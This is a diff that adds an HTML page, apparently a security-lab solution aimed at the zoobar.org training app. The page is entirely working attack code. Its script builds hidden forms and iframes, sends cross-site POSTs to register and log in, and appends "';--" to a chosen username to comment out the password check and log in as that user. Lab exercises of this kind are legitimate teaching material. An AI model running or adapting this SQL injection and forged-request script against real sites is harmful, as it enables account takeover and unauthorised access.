@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title>SQL Injection Logging - edydfang</title>
+	<meta charset="utf-8">
+</head>
+<body>
+<form id="hack">
+	<p>Enter the username you want to login</p>
+	<input type="text" id="username" name="username">
+	<input type="button" name="submit" value="Hack!" onclick="sqlInject()">
+</form>
+
+<script type="text/javascript">
+
+function sqlInject() {
+    var url_reg = "http://zoobar.org/index.php";
+    var username = document.getElementById('username').value;
+    var payload_reg = {
+        "login_username": username + "';--",
+        "login_password": "test",
+        "submit_registration": "Register"
+    };
+    var name_reg = "y50oc8jn0nlvh02gjqdz";
+    var iframe_reg = crossDomainPost(name_reg, url_reg, payload_reg);
+    iframe_reg.onload = function() {
+        console.log("test");
+        var url_login = "http://zoobar.org/index.php";
+        var payload_login = {
+            "login_username": username + "';--",
+            "login_password": "test",
+            "submit_login": "Log+in"
+        };
+        var name_login = "dka7d3one43kx4n015n0";
+        var iframe_login = crossDomainPost(name_login, url_login, payload_login);
+        iframe_reg.parentNode.removeChild(iframe_reg);
+    }
+
+
+}
+
+function crossDomainPost(name, url, payload) {
+    // Add the iframe with a unique name
+    if (document.getElementById(name + "iframe")) {
+        var iframe = document.getElementById(name + "form");
+    } else {
+        var iframe = document.createElement("iframe");
+        iframe.id = name + "iframe";
+        iframe.style.display = "none";
+        document.body.appendChild(iframe);
+        iframe.contentWindow.name = name;
+    }
+
+    if (document.getElementById(name + "form")) {
+        var form = document.getElementById(name + "form");
+    } else {
+        // construct a form with hidden inputs, targeting the iframe
+        var form = document.createElement("form");
+        form.id = name + "form";
+        form.target = name;
+        form.action = url;
+        form.target = name;
+        form.method = "POST";
+        // repeat for each parameter
+        for (var key in payload) {
+            var input = document.createElement("input");
+            input.id = name + "-input-" + key;
+            input.type = "hidden";
+            input.name = key;
+            form.appendChild(input);
+        }
+        document.body.appendChild(form);
+    }
+    for (var key in payload) {
+        var input = document.getElementById(name + "-input-" + key);
+        input.value = payload[key];
+    }
+
+    form.submit();
+    return iframe;
+}
+</script>
+</body>
+</html>
